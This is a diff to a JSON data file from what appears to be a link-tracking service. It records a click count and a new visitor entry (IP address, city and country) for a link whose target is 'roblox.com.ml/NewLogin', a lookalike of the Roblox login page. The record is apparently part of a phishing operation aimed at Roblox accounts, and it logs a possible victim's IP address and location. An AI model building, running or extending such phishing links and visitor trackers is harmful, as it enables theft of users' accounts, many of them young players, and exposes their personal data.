@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 102,
+    "useCount": 103,
     "createdBy": "admin",
     "clicks": [
       {
@@ -928,6 +928,14 @@
         "city": "Cebu City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1776926908128,
+        "ip": "78.240.85.2",
+        "country": "France",
+        "city": "Bayonne",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
